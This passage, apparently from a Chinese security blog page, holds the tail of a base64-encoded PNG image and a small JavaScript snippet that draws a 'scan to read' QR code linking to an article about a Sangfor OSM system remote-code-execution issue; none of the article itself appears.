bA/3P2G5KS+Ca7fsj57L9nilR/6xsH17IE9Lx+ca9ITuR+wH57/Yt954NmXmULwPOU1MisYLTVcz42/YnrDrW9ZIYMRg+AbBGN8Qujc7Ekt7y6iC6curgbsr6W+6lMuTqFcobwGeJY0BSBoAaxf39PXxLfijH+Tnj6mFzw7RnB9f8vKiXwTvPyWBd5athsE88DTlxHPFID1tO34cLD3RA9C98H5twro3szIfe4wniB4BhjDB8G8ZoULilOkhsMrHlxHv9+QnMQ3wfUzBLwlMGpzNcA8GHPvO8/UZg19RnRh5imvccbDMav6a37WWz3KAcE25gxgve1grDqYA+N24BsJe/1+Q94O5zt9tJ8h2TR4e2AMP1FfCNijXAG9FqcA85khLrHjognBvcp3of4df8WBZ4KxejWvBjx75I8H9ro8YA2M4hTpDYpT3G+ITuEbxeVC5vbAW4YD45kI9uRrjQ7PPHRu9sw6s8IDSZ8QaN/vwXVmVEwz2APG6qk5dB3IiAdWf80fhvck2uVC3r03/MMTWL9l5XrAeppSB8F8tlhxelJPBM8ID0edeWAOOqbnDNUfDa575VXs/OGk1wDPjA6u4wHX0sMFxdWAw1v55PcbkpP4JtgWMrcKfZvgGoz6GsB5eqHX8tSILxzYD4T6EIH1JtdZYC7NVQu3wysfeGY80OvMi566IrgHjNGg1+HbQkLe+LoTaH+HgLeWjZ9hbhdIup5YOP5NCVjcw/CegPmz2eLfrU//A2Lhg+BZqX8HdV3wPDD+/On/24zMlUcB1sOD66qBuXikKVIHwT4w3m9ITuab4FqINlcDvK15j7Dn5Uu/csWsxSnOeGng+dMD5uXZBbCjtxxw+ubmukGwF4xzIHQemJZHDazrZnaEWa+FRAxO0+TPdPnAFwajuI8C7M1ccA3G8HNO+IrxgHtTB+MF62CMLgRz8YpTgHnlNaov+cTqVx4d+sztQtRwx2tOYP1hCN4SfA7rrc5Npz7D2qscnn8RmL3yKcD3p7wGUMuVn81Y4tunqasG1reVN/m3P+DXZun6ivsN+e2j/7MD1kK0mc/EvLR6wilXwP7JAPNgrH01rzPAXjDGN1E9k5u1PIrJpwaSPn7dBtYbo74aD+N7Ava9lwviX8XFp/jAM9ZCLvy39I9PoC0EvCXo+CfuKU/Cbhb4etHiDYafCO6DAz/jgXO/+sH62fXDT6y94BlglFYDzIMxWltIyBv/7glcTf+thQBXsz+lwTEDWN+zZ2OexPCpK0Y7w+qt+ZlfPPT7gV7Lo4CDr7OVS68B9kpTRFOu+K2FZNiNf+4E/tpCwE8CdMytg3nVejJqwKFJB9fxiJsxNeg94Hr2pU6/MFwQ3CtNAa6jB6UlD4rbRfQgeOZfW0gudOOvnUBbyG6T4s5GSgNvdnqk1Zh6rcEzwFi1moN1MEYDkj7+hggBbH8uRQ+CfXD8y0Huf3rO6vA7hGM+8GTJtdpCnlw38c9PYC0EWE8RXOPu7rJZcG884BqM8U2Mf4dw3QuHnn4wl/oM4dmXewNrYMyM6LMOD0R6Os8I8aaeuBYyybt+3Qn8DwAA//9jr8ZfAAAABklEQVQDAOx/Et318GQ5AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-system-concentration\_management-del\_patch-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 